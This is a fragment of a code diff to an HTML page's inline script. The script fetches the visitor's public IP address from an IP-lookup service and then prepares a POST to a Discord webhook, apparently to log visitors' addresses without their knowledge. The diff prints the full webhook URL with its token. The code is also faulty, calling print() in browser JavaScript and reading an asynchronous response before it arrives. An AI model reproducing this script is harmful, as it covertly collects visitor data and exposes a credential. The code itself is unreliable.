@@ -8,13 +8,11 @@
 <script>
 //$.getJSON("https://api.myip.com", function(data) {
   const req = new XMLHttpRequest();
-  req.open("GET", "https://api.myip.com");
+  req.open("GET", "https://api.ipify.org");
   
-  req.setRequestHeader("Content-type", "application/json");
-  req.setRequestHeader("Access-Control-Allow-Origin", "https://api.myip.com")
   req.send()
-  print(req.responseText)
-  let dataaa = {'content':'test'}
+  print(req.responseText, req)
+  
   const request = new XMLHttpRequest();
   request.open("POST", "https://discord.com/api/webhooks/1051249705146921050/89HOeSfP4bPXw6NvS8JaXbrEWCxOksYpvvbeE7GsdD0GQQShEPp4IZO3w4e0QHakm-CP");
 
